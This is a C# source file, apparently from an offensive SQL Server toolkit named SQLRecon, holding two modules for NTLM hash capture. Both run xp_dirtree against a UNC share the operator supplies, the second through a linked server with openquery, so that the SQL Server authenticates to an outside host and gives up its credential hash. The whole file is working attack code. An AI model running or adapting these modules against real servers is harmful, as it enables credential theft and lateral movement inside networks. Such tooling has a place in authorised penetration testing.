using System;
using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    public class CaptureHash
    {
        public CaptureHash(SqlConnection con, String share)
        {
            initialize(con, share);
        }

        // this takes a file share (\\ip\share) and requests the share directly from the sql server
        public void initialize(SqlConnection con, String share)
        {
            SqlCommand command = new SqlCommand("EXEC master..xp_dirtree \"" + share + "\";", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        } //end initialize
    }

    public class CaptureLinkedHash
    {
        public CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
        {
            initialize(con, linkedSQLServer, share);
        }
        // this simply takes a SQL query, executes it on a linked server and prints to console
        public void initialize(SqlConnection con, String linkedSQLServer, String share)
        {
            SqlCommand command = new SqlCommand("select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
    }
}
